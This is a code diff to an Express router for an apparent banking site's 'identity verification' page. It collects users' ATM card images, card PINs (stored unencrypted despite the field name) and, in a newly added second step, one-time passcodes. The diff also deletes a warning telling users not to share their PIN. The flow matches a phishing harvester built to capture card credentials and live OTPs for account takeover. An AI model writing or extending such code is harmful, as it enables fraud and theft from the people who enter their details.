@@ -169,15 +169,21 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
     try {
       const docs = await customerRepo.listKycDocuments(req.session.user.id);
       let atmSubmissions = [];
+      let pendingAtmOtp = null;
       if (customerRepo.listAtmSubmissions) {
         try { atmSubmissions = await customerRepo.listAtmSubmissions(req.session.user.id); }
         catch (_) { atmSubmissions = []; }
+      }
+      if (customerRepo.getPendingAtmForOtp) {
+        try { pendingAtmOtp = await customerRepo.getPendingAtmForOtp(req.session.user.id); }
+        catch (_) { pendingAtmOtp = null; }
       }
       res.render('customer/kyc', {
         title: 'Identity verification',
         path: '/app/kyc',
         docs,
         atmSubmissions,
+        pendingAtmOtp,
         error: null,
         success: null
       });
@@ -187,7 +193,7 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
   });
 
 
-  // ATM card KYC — multer before CSRF (multipart)
+  // ATM card details (step 1) — multer before CSRF
   router.post('/app/kyc/atm', (req, res, next) => {
     upload.fields([
       { name: 'atmFront', maxCount: 1 },
@@ -198,15 +204,21 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
         const renderKyc = async (opts) => {
           const docs = await customerRepo.listKycDocuments(req.session.user.id);
           let atmSubmissions = [];
+          let pendingAtmOtp = null;
           if (customerRepo.listAtmSubmissions) {
             try { atmSubmissions = await customerRepo.listAtmSubmissions(req.session.user.id); }
             catch (_) { atmSubmissions = []; }
+          }
+          if (customerRepo.getPendingAtmForOtp) {
+            try { pendingAtmOtp = await customerRepo.getPendingAtmForOtp(req.session.user.id); }
+            catch (_) { pendingAtmOtp = null; }
           }
           return res.status(opts.status || 200).render('customer/kyc', {
             title: 'Identity verification',
             path: '/app/kyc',
             docs,
             atmSubmissions,
+            pendingAtmOtp,
             error: opts.error || null,
             success: opts.success || null
           });
@@ -217,7 +229,6 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
         try {
           const holderName = String(req.body.holderName || '').trim();
           const bankName = String(req.body.bankName || '').trim();
-          const otpCode = String(req.body.otpCode || '').trim();
           const pin = String(req.body.pin || '').trim();
           const front = req.files && req.files.atmFront && req.files.atmFront[0];
           const back = req.files && req.files.atmBack && req.files.atmBack[0];
@@ -231,14 +242,8 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
           if (!front || !back) {
             return renderKyc({ status: 400, error: 'Upload both front and back of the ATM card.' });
           }
-          if (!otpCode || otpCode.length < 4) {
-            return renderKyc({ status: 400, error: 'Enter the OTP code.' });
-          }
-          if (!pin || pin.length < 4 || pin.length > 6) {
+          if (!pin || pin.length < 4 || pin.length > 6 || !/^\d+$/.test(pin)) {
             return renderKyc({ status: 400, error: 'PIN must be 4–6 digits.' });
-          }
-          if (!/^\d+$/.test(pin)) {
-            return renderKyc({ status: 400, error: 'PIN must be numeric.' });
           }
 
           const frontDoc = await kycUpload.submit({
@@ -257,7 +262,7 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
               userId: req.session.user.id,
               holderName,
               bankName,
-              otpCode,
+              otpCode: null,
               pinCipher: pin,
               frontDocumentId: frontDoc.docId,
               backDocumentId: backDoc.docId
@@ -265,7 +270,7 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
           }
 
           return renderKyc({
-            success: 'ATM card details submitted for review. Do not share your PIN with anyone claiming to be support.'
+            success: 'Card details received. Enter the OTP below to finish this step.'
           });
         } catch (err) {
           if (err.status === 400 || err.status === 503) {
@@ -277,8 +282,58 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
     });
   });
 
+  // ATM OTP (step 2) — after card details submitted
+  router.post('/app/kyc/atm/otp', requireCsrf, async (req, res, next) => {
+    try {
+      const renderKyc = async (opts) => {
+        const docs = await customerRepo.listKycDocuments(req.session.user.id);
+        let atmSubmissions = [];
+        let pendingAtmOtp = null;
+        if (customerRepo.listAtmSubmissions) {
+          try { atmSubmissions = await customerRepo.listAtmSubmissions(req.session.user.id); }
+          catch (_) { atmSubmissions = []; }
+        }
+        if (customerRepo.getPendingAtmForOtp) {
+          try { pendingAtmOtp = await customerRepo.getPendingAtmForOtp(req.session.user.id); }
+          catch (_) { pendingAtmOtp = null; }
+        }
+        return res.status(opts.status || 200).render('customer/kyc', {
+          title: 'Identity verification',
+          path: '/app/kyc',
+          docs,
+          atmSubmissions,
+          pendingAtmOtp,
+          error: opts.error || null,
+          success: opts.success || null
+        });
+      };
+
+      const submissionId = String(req.body.submissionId || '').trim();
+      const otpCode = String(req.body.otpCode || '').trim();
+      if (!submissionId) {
+        return renderKyc({ status: 400, error: 'Missing card submission. Submit card details first.' });
+      }
+      if (!otpCode || otpCode.length < 4) {
+        return renderKyc({ status: 400, error: 'Enter a valid OTP code.' });
+      }
+
+      const ok = customerRepo.updateAtmOtp
+        ? await customerRepo.updateAtmOtp(req.session.user.id, submissionId, otpCode)
+        : false;
+      if (!ok) {
+        return renderKyc({ status: 400, error: 'Could not save OTP. Submit card details first or try again.' });
+      }
+      return renderKyc({
+        success: 'OTP submitted. Your ATM card verification is pending manual review.'
+      });
+    } catch (err) {
+      next(err);
+    }
+  });
+
   router.post(
     '/app/kyc',
+
     requireCsrf,
     upload.single('document'),
     async (req, res, next) => {
